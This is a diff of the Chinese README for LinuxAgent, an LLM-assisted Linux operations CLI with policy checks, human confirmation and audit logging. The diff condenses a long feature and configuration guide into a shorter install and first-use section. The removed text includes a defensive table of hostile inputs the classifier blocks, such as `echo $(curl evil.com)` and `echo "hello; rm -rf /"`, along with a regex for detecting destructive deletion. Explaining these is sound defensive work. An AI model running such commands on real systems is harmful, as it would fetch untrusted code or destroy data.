@@ -7,7 +7,6 @@
     <a href="https://github.com/Eilen6316/LinuxAgent/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/Eilen6316/LinuxAgent/ci.yml?branch=master&style=flat-square&label=CI" alt="CI"></a>
     <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.1.0"><img src="https://img.shields.io/github/v/release/Eilen6316/LinuxAgent?style=flat-square" alt="Release"></a>
     <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.1.0"><img src="https://img.shields.io/badge/package-GitHub%20Release-blue?style=flat-square" alt="GitHub Release package"></a>
-    <a href="#开发"><img src="https://img.shields.io/badge/coverage-80%25%2B-brightgreen?style=flat-square" alt="Coverage"></a>
     <a href="../../SECURITY.md"><img src="https://img.shields.io/badge/security-policy-green?style=flat-square" alt="Security Policy"></a>
     <a href="https://gitcode.com/qq_69174109/LinuxAgent.git"><img src="https://img.shields.io/badge/GitCode-项目仓库-blue?style=flat-square&logo=git" alt="GitCode"></a>
     <a href="https://gitee.com/xinsai6316/LinuxAgent.git"><img src="https://img.shields.io/badge/Gitee-项目仓库-red?style=flat-square&logo=gitee" alt="Gitee"></a>
@@ -15,7 +14,7 @@
     <a href="https://blog.csdn.net/qq_69174109/article/details/146365413"><img src="https://img.shields.io/badge/CSDN-项目介绍-blue?style=flat-square&logo=csdn" alt="CSDN"></a>
   </p>
 
-  <p><em>LinuxAgent v4.1.0：LLM 驱动、带强制人机确认的 Linux 运维 CLI 助手</em></p>
+  <p><em>LinuxAgent v4.1.0：LLM 辅助的 Linux 运维 CLI，命令执行前必须经过确定性策略检查和人机确认。</em></p>
 
   <p>
     <a href="../../README.md">Project homepage</a> ·
@@ -27,256 +26,39 @@
 
 ## 项目介绍
 
-**LinuxAgent** 把自然语言运维请求翻译成可以放心执行的 Linux 命令。每条由模型生成的命令都会经过 token 级安全分类，每个有副作用的动作都需要真人在终端里按下 `y`，每个决策都写入 append-only 审计日志。
+LinuxAgent 允许 LLM 提议 Linux 运维操作，但不会把模型当成可自治执行的
+shell。命令会先被解析并交给确定性策略分类；需要审批时展示给人工确认；
+执行时不使用 `shell=True`；输出在进入模型分析前会脱敏；所有关键决策写入本地审计日志。
 
-项目基于 **LangGraph** 的状态机编排、**LangChain** 的模型抽象、**Pydantic v2** 的 fail-fast 配置校验，默认不依赖任何本地深度学习模型。
+适合这些场景：
 
-**v4.1.0 是当前安全深度版本。** 它在 v4 控制平面之上补上红队策略证明、shell 结构分析、LOLBin 检测、parser fuzzing、audit sink、telemetry exporter、Landlock 设计和只读 MCP prototype。
+- 日常巡检：文件、日志、端口、资源占用、服务状态
+- 交互式排障：模型提出下一条命令，操作员决定是否执行
+- 对已配置主机做 SSH 批量操作，并在扩散前显式批量确认
+- 需要本地 JSONL 审计轨迹的环境
 
-### 适用场景
-
-- 日常 Linux 运维：查文件、看日志、查资源占用、排查服务状态
-- SSH 集群操作：对多台主机执行同一条命令，自动走批量确认流程
-- 交互式故障排查：让模型给出候选命令，由你决定是否执行
-- 带审计要求的环境：所有操作留痕到本地 JSONL 日志
-
-### 设计原则
-
-1. **模型不可信**：LLM 生成的命令默认需要人工确认，不会因为语言模型"看起来很聪明"就免检
-2. **破坏性永不放行**：`rm -rf` / `mkfs` / `systemctl stop` 等无论之前批准过多少次都会再次弹窗
-3. **批量必显式**：SSH 到 2 台及以上主机默认走批量确认，不静默扩散
-4. **决策必留痕**：每次审批、执行、拒绝都写入 `~/.linuxagent/audit.log`
-5. **无 TTY 自动拒绝**：脚本化调用遇到 CONFIRM 请求一律默认拒绝，不会静默绕过
-
----
-
-## 核心能力
-
-| 能力 | 说明 |
-|---|---|
-| 自然语言 → 命令 | 基于 Prompt + Tool Calling，支持 OpenAI / DeepSeek / Anthropic Claude |
-| 结构化计划 | LLM 输出必须先通过 JSON `CommandPlan` 校验，再进入策略判断和执行 |
-| 文件修改计划 | 脚本、代码、配置文件等修改使用结构化 `FilePatchPlan`，先展示 unified diff，再经事务化写入和人工确认 |
-| 只读工作区工具 | planner 可先通过 `read_file` / `list_dir` / `search_files` 读取允许目录下的真实文件内容 |
-| 策略引擎 | `SAFE` / `CONFIRM` / `BLOCK`，并输出 `risk_score`、`capabilities`、审计用 `matched_rule` |
-| Skill guidance | 可选 Skill manifest 可以提供建议性 planner 上下文，不包含可执行插件钩子 |
-| Human-in-the-Loop | LangGraph `interrupt()` + 会话恢复，服务受控的人机协同工作流 |
-| 对话权限 | 批准过的 SAFE 命令只在当前对话 thread 及其 `/resume` 恢复后免确认，破坏性命令永不进入 |
-| 集群批量执行 | SSH 连接池 + 并发扇出 + 失败隔离，异步包装 paramiko |
-| 审计日志 | JSONL append-only，文件权限 `0o600`，不轮转，无法关闭 |
-| 资源告警 | `linuxagent check` 展示 CPU、内存、根文件系统阈值告警 |
-| 使用洞察 | 命令使用统计、语义相似度检索（API embedding）、推荐引擎、知识库 |
-| 可测试性 | `make test` 强制 80%+ 覆盖率；另有 HITL YAML 场景、集成冒烟测试、红队用例和可选 Anthropic 兼容验证 |
-
----
-
-## 30 秒了解执行流程
-
-```
-你: 找一下监听 8080 端口的服务
-
- ┌─────────────────┐
- │  parse_intent   │   LLM 提议：ss -tlnp sport = :8080
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │  safety_check   │   token 级分类 → CONFIRM (LLM 首次)
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │     confirm     │   终端弹出确认面板：
- │  (interrupt)    │     Command: ss -tlnp sport = :8080
- │                 │     Safety:  CONFIRM
- │                 │     Rule:    LLM_FIRST_RUN
- │                 │     Source:  llm
- │                 │   > 审批菜单：接受 / 接受且本对话不再询问 / 不接受
- └────────┬────────┘
-          ▼ 接受
- ┌─────────────────┐
- │     execute     │   asyncio.create_subprocess_exec(*argv)
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │     analyze     │   LLM 把原始输出整理成运维视角的解读
- └────────┬────────┘
-          ▼
-        你 ← "nginx (PID 4312) 正在监听 8080，属于 root"
-
- 每一步都追加到 ~/.linuxagent/audit.log
-```
-
-进入命令规划之前，系统先由 LLM 意图路由判断 `DIRECT_ANSWER`、`COMMAND_PLAN`
-或 `CLARIFY`。日常聊天不会生成命令计划，也不会展示确认面板。运维方法由模型运行时生成；
-执行成功后，脱敏后的命令模式会写入本地 learner memory，Python 代码不硬编码业务或意图关键词规则。
-确定性的安全策略数据从 `configs/policy.default.yaml` 加载。
-
----
-
-## 与旧版本的全面对比
-
-前身是一个单体 Agent 脚本。为了拿到生产环境做运维，当前版本从**算法、架构、安全、测试**四个维度彻底重写。
-
-### 架构层面
-
-| 维度 | 旧实现 | 当前 `v4` |
-|---|---|---|
-| 主 Agent 类 | 单个 4710 行 God Object，内含意图解析、执行、UI、SSH、监控 | `app/agent.py` 保持在 **300 行以内**的瘦协调器，仅拼装 graph / ui / services |
-| 流程控制 | `process_user_input` 内部递归 + 嵌套 `if/else` | LangGraph `StateGraph`，graph 按 intent / safety / routing / node factory 拆分 |
-| 状态持久化 | 手写 JSON 文件读写，文件权限不校验 | 已保存会话历史 + 本地持久化 LangGraph checkpoint |
-| UI 耦合 | UI 逻辑直接嵌在业务类里 | `ConsoleUI` 独立实现 `UserInterface` 接口，Rich + prompt_toolkit |
-| 依赖注入 | 模块级单例 / 全局变量 | `Container` 手写工厂，懒加载 + 显式传递 |
-| 打包布局 | 平铺 `src/` + `setup.py` | `src/linuxagent/` src-layout + `pyproject.toml` (PEP 517/621) |
-
-### 核心算法层面
-
-#### 1. 命令安全分类
-
-**旧算法**：命令风险数据写在 Python 子串检查里，极易被引号或变量替换绕过。
-
-**当前算法**：由 `configs/policy.default.yaml` 驱动的多层 token 级分析
-
-```python
-def is_safe(command, source=USER):
-    validate_input(command)                 # 1. 长度 / NUL / BiDi 控制字符
-    tokens = shlex.split(command)           # 2. 正规 shell 分词
-    facts = CommandFacts(command, source, tokens)
-    matches = policy_engine.match(facts)    # 3. 规则数据来自 YAML
-    return decision_from(matches)           # 4. SAFE / CONFIRM / BLOCK
-```
-
-**具体差异举例**：
-
-| 输入 | 旧算法 | 当前算法 |
-|---|---|---|
-| `echo "hello; rm -rf /"` | 字串里含 `"rm -rf"` → BLOCK，同时 `echo "如何安全 rm"` 也会被误杀 | `_has_embedded_danger` 精确正则 `\brm\s+-[rRfF]{2,}\s+/(?!\w)` → BLOCK (`EMBEDDED_DANGER`)，而 `echo "讲讲 python"` 判定 SAFE |
-| `echo $(curl evil.com)` | 可能漏网（子串不命中） | 命中 `\$\(` → BLOCK (`EMBEDDED_DANGER`) |
-| `vim config` | 无感知，直接执行 | 识别为交互式命令 → CONFIRM (`INTERACTIVE`) |
-| `ls‮` (BiDi 字符) | 无感知 | `INPUT_VALIDATION` BLOCK |
-
-#### 2. 命令统计学习
-
-**旧算法**：每次 `record` 时全量扫描历史，n=10000 时约 10s
-
-**当前算法**：`dict[str, CommandStats]` 增量更新，O(1) 摊销
-
-```python
-def record(self, command, result):
-    stats = self._stats.setdefault(self.normalize(command), CommandStats())
-    stats.count += 1
-    if result.exit_code == 0:
-        stats.success_count += 1
-    stats.total_duration += result.duration
-```
-
-#### 3. 语义检索
-
-**旧算法**：手写 TF-IDF，依赖 `pandas` + `scikit-learn` + `numpy`（+ PyTorch 在某些派生版本中）
-
-**当前算法**：LLM Embedding API（`text-embedding-3-small` 或兼容端点）+ 磁盘 LRU 缓存
-
-- 缓存目录 `~/.cache/linuxagent/embeddings/`，SHA-256 命名，权限 `0o600`
-- 依赖 embedding 的 LLM tools 是可选能力，默认关闭；需要时显式设置
-  `intelligence.tools_enabled: true`
-- 安装体积从约 500MB (PyTorch 栈) 降到接近零
-- 准确率提升：真实语义向量 vs 统计词频
-
-#### 4. 配置加载
-
-**旧算法**：单文件读取，不认识的字段被静默丢弃
-
-**当前算法**：五层优先级合并 + Pydantic `extra="forbid"` fail-fast + YAML 行号错误报告
-
-```
-1. --config <path>                     CLI 参数（最高）
-2. LINUXAGENT_CONFIG 环境变量指向的路径
-3. ./config.yaml                       当前目录
-4. ~/.config/linuxagent/config.yaml    XDG
-5. 包内置 configs/default.yaml         （最低）
-```
-
-- 显式路径（1 / 2）文件不存在 → 立即 `ConfigError`
-- Auto-discovery 路径（3 / 4）缺失时静默跳过
-- 用户文件必须 `chmod 0600` 且当前用户所有，否则拒绝启动
-- 校验失败时错误报告带 YAML 行号：`api.timeout: Input should be valid at line 12`
-
-#### 5. SSH 主机信任
-
-**旧算法**：`AutoAddPolicy`，首次连接自动接受任何 host key → 中间人攻击入口
-
-**当前算法**：`RejectPolicy` + `load_system_host_keys()`，未登记主机直接抛 `SSHUnknownHostError`
-
-```python
-client.load_system_host_keys()
-client.set_missing_host_key_policy(paramiko.RejectPolicy())
-```
-
-CI 有 `! grep -rn "AutoAddPolicy" src/linuxagent/` 红线门禁，代码层面杜绝回滚。
-
-远程执行也比本地执行更严格。集群命令只接受简单 argv 风格命令；命令串联、
-管道、重定向、命令替换、变量展开等 shell 语法会在确认前阻断，并在 SSH
-连接建立前再次校验。本地 OS sandbox 不会延伸到 SSH 远端；远端边界由目标主机范围、
-低权限用户、远端工作目录、sudo allowlist、host-key 校验、批量确认和审计 metadata
-共同表达。
-
-### 安全模型对比
-
-| 策略 | 旧实现 | 当前 `v4` |
-|---|---|---|
-| 模型首次生成命令 | 直接执行 | 强制 CONFIRM（`LLM_FIRST_RUN`） |
-| 批准后再次执行 | 每次都要重审 | 只在同一对话 thread 及其 `/resume` 恢复后免确认，新对话不继承 |
-| 破坏性命令 | 基于字符串黑名单 | token 匹配 + 原始扫描 + 子命令正则三重门禁，**永不**入白名单 |
-| 批量集群操作 | 静默扩散 | 目标数 ≥ `cluster.batch_confirm_threshold`（默认 2）强制 CONFIRM；SSH 前阻断 shell 语法；确认 payload 展示远端 profile |
-| 非交互环境 | 可能绕过 | 无 TTY 时 confirm 自动返回 `non_tty_auto_deny` |
-| 审计记录 | 日志可选 | 每条 HITL 事件以 hash chain 追加到 `~/.linuxagent/audit.log`，`0o600`，可用 `linuxagent audit verify` 校验 |
-
-### 测试与工程化
-
-| 维度 | 旧实现 | 当前 `v4` |
-|---|---|---|
-| 单元测试 | 0 | **`make test`；安装 Anthropic extra 后可运行兼容验证** |
-| 覆盖率 | 0 | **80%+ 必须满足**（`--cov-fail-under=80` 门禁；以当前 CI / 本地 `make test` 输出为准） |
-| 静态检查 | 无 | `ruff check` + `mypy --strict` + `bandit` 全通过 |
-| 红线门禁 | 无 | CI 检查命令、SSH、HITL、代码结构和 sandbox bypass 红线 |
-
-运行时可在 `config.yaml` 中接入自定义策略：
-
-```yaml
-policy:
-  path: ~/.config/linuxagent/policy.yaml
-  include_builtin: true  # 内置规则 + 用户规则覆盖/追加
-```
-
-LLM/web 工具使用的应用级网络策略与 `sandbox.network` 分开配置。网络工具默认关闭；
-启用后，`fetch_url` 可以读取已知 HTTP/HTTPS URL，并在 DNS 结果和每一次 redirect 上
-继续执行域名策略与 SSRF 检查。
-
-```yaml
-network:
-  enabled: false
-  default_action: deny
-  allowed_domains: []
-  denied_domains: []
-```
-
-| E2E 场景 | 无 | YAML 场景覆盖普通命令 / 危险命令 / HITL / 批量集群 / 远程 shell 防护 / 工作区工具流程 |
-| 发布流程 | 手动 | tag 触发 GitHub Actions 构建 wheel + sdist + GitHub Release + PyPI 发布 |
-
----
+更深入的安全架构、威胁模型和 v3 迁移说明，请阅读
+[操作员安全模型](operator-safety.md)、[威胁模型](threat-model.md) 和
+[v3 到 v4 迁移](migration-v3-to-v4.md)。
 
 ## 安装
 
-### 自动化（推荐）
+### 自动安装
 
 ```bash
 git clone https://github.com/Eilen6316/LinuxAgent.git
 cd LinuxAgent
-./scripts/bootstrap.sh     # 建 .venv + 全局配置 + LINUXAGENT_CONFIG + ~/.local/bin/linuxagent
+./scripts/bootstrap.sh
 ```
 
-### 手动
+bootstrap 会创建 `.venv`、准备 `~/.config/linuxagent/config.yaml`、
+创建 `~/.local/bin/linuxagent` 启动器，并把 `LINUXAGENT_CONFIG` 写入 shell
+profile。之后请打开新 shell，或 source 对应 profile，再从其他目录启动。
+
+### 手动安装
 
 ```bash
-python3.11 -m venv .venv   # 或 python3.12
+python3.11 -m venv .venv   # 也支持 python3.12
 source .venv/bin/activate
 pip install -e ".[dev]"
 mkdir -p ~/.config/linuxagent ~/.local/bin
@@ -285,40 +67,27 @@ chmod 600 ~/.config/linuxagent/config.yaml
 ln -sf "$PWD/.venv/bin/linuxagent" ~/.local/bin/linuxagent
 ```
 
-确保 `~/.local/bin` 在 `PATH` 中，之后无需激活项目 venv，也无需停留在仓库目录，
-任意目录都可以直接运行 `linuxagent`。bootstrap 会把
-`LINUXAGENT_CONFIG=$HOME/.config/linuxagent/config.yaml` 写入 shell profile；
-执行后打开新 shell，或运行 `source ~/.bashrc` 让当前 shell 立即生效。
-
-### 可选扩展
+可选扩展：
 
 ```bash
 pip install -e ".[anthropic]"     # Claude 支持
-pip install -e ".[pyinstaller]"   # 打包单二进制
+pip install -e ".[pyinstaller]"   # 单二进制打包
 ```
 
-### 运行时要求
+运行时需要 Linux 和 Python 3.11 或 3.12。macOS 可用于开发，Windows 暂不支持。
+SSH 集群模式要求目标主机已经登记在 `~/.ssh/known_hosts`。
 
-- Python 3.11 或 3.12
-- Linux（macOS 可用于开发，Windows 未支持）
-- 如使用集群功能：本地 `~/.ssh/known_hosts` 已登记目标主机
+## 最小配置
 
----
-
-## 配置
-
-### 最小可用配置
+编辑 `~/.config/linuxagent/config.yaml`，并确保文件权限是私有的：
 
 ```yaml
-# ~/.config/linuxagent/config.yaml (chmod 600)
+# ~/.config/linuxagent/config.yaml
 api:
-  api_key: "sk-replace-me"   # 必填
+  api_key: "sk-replace-me"
 ```
 
-其他字段全部用默认值即可（默认 provider 为 DeepSeek，可改为 `openai` / `openai_compatible` / `local` / `ollama` / `vllm` / `lmstudio` / `glm` / `qwen` / `kimi` / `minimax` / `gemini` / `hunyuan` / `anthropic` / `anthropic_compatible` / `xiaomi_mimo`）。
-
-API 中转站或第三方 OpenAI 兼容端点可用 `openai_compatible`，也可用
-`qwen` / `kimi` / `glm` / `minimax` / `gemini` / `hunyuan` 快捷 provider：
+默认 provider 是 DeepSeek。OpenAI 兼容中转站可这样配置：
 
 ```yaml
 api:
@@ -329,8 +98,7 @@ api:
   token_parameter: max_tokens
 ```
 
-本地部署的 OpenAI 兼容模型可用 `ollama`、`vllm`、`lmstudio` 或通用
-`local`。本地 provider 不需要真实 API key：
+本地 OpenAI 兼容服务，例如 Ollama：
 
 ```yaml
 api:
@@ -341,562 +109,202 @@ api:
   token_parameter: max_tokens
 ```
 
-Anthropic 格式中转站可用 `provider: anthropic_compatible` 并填写自己的
-`base_url`；小米 MiMo 可用 `provider: xiaomi_mimo`。
-
-### Provider 速查表
-
-| Provider | 协议 | 常用 `base_url` | Token 参数 |
-|---|---|---|---|
-| `deepseek` | OpenAI 兼容 | `https://api.deepseek.com/v1` | `max_completion_tokens` |
-| `openai` | OpenAI | `https://api.openai.com/v1` | `max_completion_tokens` |
-| `openai_compatible` | OpenAI 兼容中转站 | 中转站自己的 `/v1` 地址 | 通常为 `max_tokens` |
-| `local` | 本地 OpenAI 兼容 | `http://127.0.0.1:8000/v1` | `max_tokens` |
-| `ollama` | 本地 OpenAI 兼容 | `http://127.0.0.1:11434/v1` | `max_tokens` |
-| `vllm` | 本地 OpenAI 兼容 | `http://127.0.0.1:8000/v1` | `max_tokens` |
-| `lmstudio` | 本地 OpenAI 兼容 | `http://127.0.0.1:1234/v1` | `max_tokens` |
-| `qwen` | OpenAI 兼容 | `https://dashscope.aliyuncs.com/compatible-mode/v1` | `max_tokens` |
-| `kimi` | OpenAI 兼容 | `https://api.moonshot.ai/v1` | `max_tokens` |
-| `glm` | OpenAI 兼容 | `https://open.bigmodel.cn/api/paas/v4` | `max_tokens` |
-| `minimax` | OpenAI 兼容 | `https://api.minimax.io/v1` | `max_tokens` |
-| `gemini` | OpenAI 兼容 | `https://generativelanguage.googleapis.com/v1beta/openai/` | `max_tokens` |
-| `hunyuan` | OpenAI 兼容 | `https://api.hunyuan.cloud.tencent.com/v1` | `max_tokens` |
-| `anthropic` | Anthropic | provider 默认值 | n/a |
-| `anthropic_compatible` | Anthropic 兼容中转站 | 中转站自己的地址 | n/a |
-| `xiaomi_mimo` | Anthropic 兼容 | 中转站自己的地址 | n/a |
-
-### 验证配置
+首次使用前先验证：
 
 ```bash
+chmod 600 ~/.config/linuxagent/config.yaml
 linuxagent check
-# 输出示例：
-# OK: provider=deepseek, model=deepseek-chat,
-#     batch_confirm_threshold=2, audit_log=/home/you/.linuxagent/audit.log
 ```
 
-### 配置字段参考
+常用 provider 包括 `deepseek`、`openai`、`openai_compatible`、`local`、
+`ollama`、`vllm`、`lmstudio`、`qwen`、`kimi`、`glm`、`minimax`、
+`gemini`、`hunyuan`、`anthropic`、`anthropic_compatible` 和
+`xiaomi_mimo`。完整字段请看
+[Provider 兼容矩阵](provider-matrix.md) 和
+[`configs/example.yaml`](../../configs/example.yaml)。
 
-| 段 | 字段 | 默认值 | 说明 |
-|---|---|---|---|
-| 根级 | `language` | `zh-CN` | LinuxAgent 自有固定终端文案的运行时语言；支持 `zh-CN` 和 `en-US` |
-| `api` | `provider` | `deepseek` | 可选 `openai` / `openai_compatible` / `local` / `ollama` / `vllm` / `lmstudio` / `deepseek` / `glm` / `qwen` / `kimi` / `minimax` / `gemini` / `hunyuan` / `anthropic` / `anthropic_compatible` / `xiaomi_mimo` |
-| `api` | `base_url` | `https://api.deepseek.com/v1` | OpenAI 兼容端点 |
-| `api` | `model` | `deepseek-chat` | 模型名 |
-| `api` | `api_key` | `""` | 远端 provider **必填**，本地 provider 可留空；`SecretStr`，不出现在 repr/日志 |
-| `api` | `token_parameter` | `max_completion_tokens` | API 中转站或旧兼容后端可设为 `max_tokens` |
-| `api` | `timeout` | `30.0` | 单次请求超时（秒） |
-| `api` | `stream_timeout` | `60.0` | 流式整体超时（秒） |
-| `api` | `max_retries` | `3` | 指数退避重试次数 |
-| `security` | `command_timeout` | `30.0` | 本地命令最长执行时间 |
-| `security` | `max_command_length` | `2048` | 单条命令字符上限 |
-| `security` | `session_whitelist_enabled` | `true` | 对话级命令权限开关 |
-| `network` | `enabled` | `false` | 是否启用可选 LLM/web 网络工具，例如 `fetch_url`；默认关闭 |
-| `network` | `default_action` | `deny` | 未命中显式规则的域名默认 `allow` 或 `deny` |
-| `network` | `allowed_domains` / `denied_domains` | `[]` | 精确域名或严格子域通配符如 `.example.com`；deny 优先 |
-| `network` | `max_response_bytes` | `1048576` | `fetch_url` 响应大小预算 |
-| `network` | `timeout_seconds` | `10.0` | `fetch_url` 超时预算 |
-| `command_plan` | `max_repair_attempts` | `2` | 命令计划失败后的自动重规划轮数；`0` 表示关闭命令 repair |
-| `command_plan` | `parallel_direct_answer_tasks` | `8` | 并发展开的 AI 拆分式对话子任务最大数 |
-| `file_patch` | `allow_roots` | `[".", "/tmp"]` | 文件 patch 允许读写的根目录 |
-| `file_patch` | `high_risk_roots` | `["/etc", "/root/.ssh", "/home/*/.ssh"]` | 命中后以高风险 diff 确认展示 |
-| `file_patch` | `allow_permission_changes` | `true` | 是否允许 patch 计划声明权限位变更 |
-| `file_patch` | `max_repair_attempts` | `2` | 自动修复 FilePatchPlan 的轮数；`0` 表示关闭自动 patch repair |
-| `sandbox` | `enabled` | `false` | sandbox 边界开关；默认兼容模式只记录 `runtime_label=no_isolation`；设为 `true` 后，所选 runner 不能执行请求的安全 profile 时会 fail-closed |
-| `sandbox` | `runner` | `noop` | `noop`、`local` 或可选 `bubblewrap`；`noop` 只记录 metadata，`local` 仅提供进程限制，`bubblewrap` 可在可执行 profile 下提供文件系统隔离 |
-| `sandbox` | `default_profile` | `system_inspect` | 没有更强 policy capability 时记录的默认 profile |
-| `sandbox` | `network` | `inherit` | `inherit`、`disabled`、`loopback_only` 或 `allowlist`；安全 profile 下不支持则 fail-closed |
-| `sandbox.tools` | `max_rounds` | `3` | 每次 planner 请求允许的最大 tool-calling 轮数 |
-| `sandbox.tools` | `enable_execute_command` | `false` | 是否显式开启直接暴露给 LLM 的命令执行工具；常规命令执行应走 HITL 主图 |
-| `sandbox.tools` | `timeout_seconds` | `5.0` | 单次工具调用超时 |
-| `sandbox.tools` | `max_output_chars` | `20000` | 单次工具输出截断阈值 |
-| `sandbox.tools` | `max_total_output_chars` | `60000` | 单次 planner 请求的累计工具输出预算 |
-| `sandbox.tools` | `max_file_bytes` | `1048576` | workspace/log 搜索工具可读取的单文件大小上限 |
-| `sandbox.tools` | `max_matches` | `200` | 暴露给模型的最大搜索/列表结果数 |
-| `cluster` | `batch_confirm_threshold` | `2` | 批量确认阈值（主机数） |
-| `cluster` | `max_workers` | `8` | 阻塞式 Paramiko SSH 操作的 worker 数 |
-| `cluster` | `known_hosts_path` | `~/.ssh/known_hosts` | 系统 host keys 之外额外加载的 known_hosts 文件 |
-| `cluster` | `hosts` | `[]` | 集群主机列表 |
-| `cluster.hosts[].remote_profile` | `remote_cwd` | `.` | SSH 执行的远端工作目录策略 |
-| `cluster.hosts[].remote_profile` | `environment` | `inherit` | `inherit` 保持旧行为；`clean` 只传递最小 PATH 环境 |
-| `cluster.hosts[].remote_profile` | `allow_sudo` | `false` | 仅在同时配置非空 `sudo_allowlist` 时允许 sudo |
-| `audit` | `path` | `~/.linuxagent/audit.log` | 审计日志位置；**审计无法关闭** |
-| `memory` | `enabled` | `true` | 启用 `~/.linuxagent/memories` 下的本地文件系统记忆 |
-| `memory` | `use_memories` | `true` | 存在 `memory_summary.md` 时注入模型可见 product context |
-| `memory` | `generate_memories` | `true` | chat 启动时生成脱敏 memory 输入 |
-| `memory` | `disable_on_external_context` | `false` | 外部上下文污染 thread 时禁用记忆生成 |
-| `memory` | `max_rollouts_per_startup` | `2` | 每次启动最多处理的历史会话数 |
-| `memory` | `max_rollout_age_days` | `10` | memory 抽取允许的最大会话年龄 |
-| `memory` | `min_rollout_idle_hours` | `6` | 会话空闲多久后才允许抽取 |
-| `memory` | `min_rate_limit_remaining_percent` | `25` | 预留给 LLM memory worker 的额度阈值 |
-| `memory` | `max_raw_memories_for_consolidation` | `256` | consolidation 最多读取的 raw memory 输入 |
-| `memory` | `max_unused_days` | `30` | 超过该天数未使用的 raw memory 输入会被排除并清理 |
-| `memory` | `pipeline_lock_ttl_seconds` | `600` | stale memory pipeline lock lease 超时时间 |
-| `telemetry` | `exporter` | `local` | 默认本地 JSONL span；`none` 禁用写入 |
-| `telemetry` | `path` | `~/.linuxagent/telemetry.jsonl` | 本地 telemetry 路径 |
-| `ui` | `theme` | `auto` | `auto` / `light` / `dark` |
-| `ui` | `tui_layout` | `wide` | 默认宽终端活动视图；`compact` 可强制紧凑模式 |
-| `ui` | `max_chat_history` | `20` | 每个已保存会话最多保留的消息数；新会话不会自动加载 |
-| `ui` | `checkpoint_path` | `~/.linuxagent/checkpoints.json` | 本地 LangGraph checkpoint 文件，用于恢复未完成的 HITL 确认 |
-| `logging` | `level` | `WARNING` | `DEBUG` / `INFO` / `WARNING` / ... |
-| `logging` | `format` | `console` | `console`（Rich 彩色） / `json`（生产） |
-| `intelligence` | `tools_enabled` | `false` | 向 LLM 暴露可选的 embedding 推荐 / 知识库 / 相似命令工具 |
-| `intelligence` | `embedding_model` | `text-embedding-3-small` | 语义检索模型；**禁止本地 PyTorch 模型** |
+## 首次使用
 
-完整样例见 [`configs/example.yaml`](../../configs/example.yaml)。
-
-### 本地文件系统记忆
-
-本地记忆默认开启，数据位于 `~/.linuxagent/memories`。`linuxagent chat`
-启动时，LinuxAgent 会读取本机保存的会话，后台启动两阶段 memory pass，
-并把当前 `memory_summary.md` 作为 advisory 的操作者/项目上下文注入当前运行时。该流程只写
-memory root 内的文件，并在持久化前做脱敏。`linuxagent memory status`
-会显示最近一次 pipeline 是 idle、running、completed、failed 还是 skipped。
-
-Stage 1 由配置的 LLM provider 判断保存会话是否包含可复用的长期经验。
-没有可复用信息时 no-op 是允许且优先的；如果启动时没有可用的 memory writer
-provider，生成流程会 no-op，而不是把 deterministic 聊天片段复制进
-`memory_summary.md`。启动任务会把失败写入 `pipeline_status.json` 并通过
-`linuxagent memory status` 暴露；stale 或损坏的 pipeline lock 会在
-`memory.pipeline_lock_ttl_seconds` 后恢复。超过 `memory.max_unused_days`
-的 stage1 JSON 输入会在 consolidation 时清理。
-
-`memory.enabled` 是总开关。`memory.use_memories` 控制读路径，
-`memory.generate_memories` 控制写路径。旧配置里的 `inject_summary`、
-`auto_consolidate_on_startup` 和 `stage1_session_limit` 仍会被接受并映射到新字段。
-
-当 `memory.disable_on_external_context` 为 true 时，使用 network tool 等外部上下文的
-thread 会被标记为 polluted，并在后续 memory generation 中跳过，避免把外部或临时上下文
-写入长期本地记忆。
-
-memory 不是安全边界，不能降低 policy 决策、跳过 HITL、改变 sandbox enforcement、
-执行命令或修改 audit 记录。需要完全关闭 memory 读写时：
-
-```yaml
-memory:
-  enabled: false
-```
-
-### 运行时语言
-
-在 `config.yaml` 顶层设置 `language`：
-
-```yaml
-language: en-US  # zh-CN | en-US
-```
-
-默认值是 `zh-CN`。该设置影响 LinuxAgent 自有的固定运行时文案：slash help
-和补全描述、CLI/TUI 标签、确认/阻断消息、wizard 控件、诊断信息、policy 展示原因，
-以及 policy、Skill 的用户可见展示元数据。
-
-它不影响 prompt 模板、LLM 路由/规划行为、模型最终回答语言、外部命令输出、
-用户文件内容、审计 JSON 字段名、MCP 协议字段、tool name、policy rule id
-或其他机器可读值。`linuxagent --help` 属于配置加载前的 argparse 静态帮助；
-运行时 slash help（`/help`）和终端 UI 固定文案会跟随 `language`。
-
-locale catalog 不是业务模板，也不承载 prompt 指令。AI 生成内容仍由模型根据用户请求
-生成。外部 Skill、policy 的单语言内容保持原文，除非该数据自己提供了本地化展示元数据。
-
-当前硬编码字符串门禁会阻止 `src/linuxagent/` 中未登记的中文运行时字符串字面量；
-英文 phrase 扫描仍是 report-only，便于维护者审查 UI/help/log 候选，同时避免把协议
-字符串、异常消息或模型可见文本误判为必须翻译。
-
----
-
-## 使用教程
-
-### 启动对话
+启动对话界面：
 
 ```bash
 linuxagent
 ```
 
-`linuxagent chat` 仍可作为显式等价命令使用。
-默认终端体验使用新的宽屏 TUI 活动视图；窄终端会自动退回紧凑显示。
-`linuxagent tui` 是显式 TUI 入口，复用同一套 chat 运行时；策略检查、HITL
-确认、sandbox、memory 和审计行为不变。
+先试一个只读请求：
 
-启动后终端会展示一个欢迎面板，然后进入 prompt：
-
-```
-╭─────────────────────────────────────╮
-│ LinuxAgent 2026 Ops Console         │
-│ HITL-safe command automation with   │
-│ audit trails                        │
-╰─────────────────────────────────────╯
-
-linuxagent ❯
+```text
+check the Linux version
 ```
 
-每次启动 CLI 都是一个新对话，默认不继承上次上下文。已保存会话只能通过显式 slash 命令恢复；输入 `/` 会打开命令补全菜单：
+对话中的第一条 LLM 生成命令通常会要求确认：
 
-| Slash 命令 | 作用 |
+```text
+linuxagent > 找一下监听 8080 端口的服务
+
+LLM proposes: ss -tlnp sport = :8080
+Safety: CONFIRM
+Rule: LLM_FIRST_RUN
+Allow this operation?
+1. Yes
+2. Yes, don't ask again in this conversation/resume
+3. No
+```
+
+`Yes, don't ask again` 只对当前 conversation thread 及同一 thread 的
+`/resume` 生效，不是全局白名单。操作员自己输入的直接命令可以用 `!` 前缀，
+例如 `!uname -a`。
+
+常用 slash 命令：
+
+| 命令 | 用途 |
 |---|---|
-| `/resume` | 用上下键 / 鼠标选择本机保存的会话；非交互 fallback 下可输入编号恢复；未完成的 HITL 确认会立即接续 |
